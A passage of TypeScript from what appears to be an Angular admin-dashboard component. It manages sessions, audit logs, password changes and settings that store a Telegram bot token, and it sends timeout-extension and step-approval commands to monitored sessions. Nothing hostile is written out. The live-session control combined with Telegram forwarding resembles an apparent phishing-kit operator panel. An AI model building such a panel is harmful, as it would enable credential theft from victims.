  bulkPin() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; ids.forEach(id => this.state.pinSession(id)); this.selectedSessionIds.set(new Set()); }
  bulkExport() { this.state.showAdminToast('Exporting...'); }
  toggleAllSelection(e: Event) { const checked = (e.target as HTMLInputElement).checked; if (checked) { const allIds = this.filteredHistory().map(h => h.id); this.selectedSessionIds.set(new Set(allIds)); } else this.selectedSessionIds.set(new Set()); }
  toggleSelection(id: string, e: Event) { e.stopPropagation(); this.selectedSessionIds.update(set => { const newSet = new Set(set); if (newSet.has(id)) newSet.delete(id); else newSet.add(id); return newSet; }); }
  isAllSelected() { const filtered = this.filteredHistory(); if (filtered.length === 0) return false; return this.selectedSessionIds().size === filtered.length; }
  async fetchAuditLogs() { try { const res = await fetch('/api/admin/audit', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.auditLogs.set(await res.json()); } catch(e) {} }
  calcStats() { const users = this.userList(); const history = this.state.history(); const active = this.state.activeSessions(); this.kpiStats.set({ total: history.length + active.length, active: active.length, verified: history.filter(h => !h.data?.isArchivedIncomplete).length, clicks: 0 }); }
  async changePassword() { if (!this.settingOldPass || !this.settingNewPass) { this.state.showAdminToast('Fill all fields'); return; } const success = await this.state.changeAdminPassword(this.settingOldPass, this.settingNewPass); if (success) { this.state.showAdminToast('Password Changed'); this.settingOldPass = ''; this.settingNewPass = ''; } else this.state.showAdminToast('Incorrect Old Password'); }
  async saveSettings() { try { await fetch('/api/admin/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.flowSettings, telegramConfig: { token: this.tgToken, chat: this.tgChat } }) }); this.state.showAdminToast('Settings Saved'); } catch(e) { this.state.showAdminToast('Save Failed'); } }
  async deleteSettings() { if(await this.modal.confirm('Delete Credentials', 'Are you sure you want to remove the Telegram credentials?', 'danger')) { this.tgToken = ''; this.tgChat = ''; this.saveSettings(); } }
  extendTimeout(ms: number) { const s = this.monitoredSession(); if (s) { this.state.sendAdminCommand(s.id, 'EXTEND_TIMEOUT', { duration: ms }); this.state.showAdminToast(`Added +${ms/1000}s`); } }
  requestFlow(f: any) { this.state.adminApproveStep({ flow: f }); }
  viewLinkedSession() { const linkedId = this.monitoredSession()?.data?.linkedSessionId; if (!linkedId) return; const found = this.state.history().find(h => h.id === linkedId); if (found) this.viewHistory(found); else this.state.showAdminToast('Linked session not found in history'); }
  exportTxt(s: any) {}
}
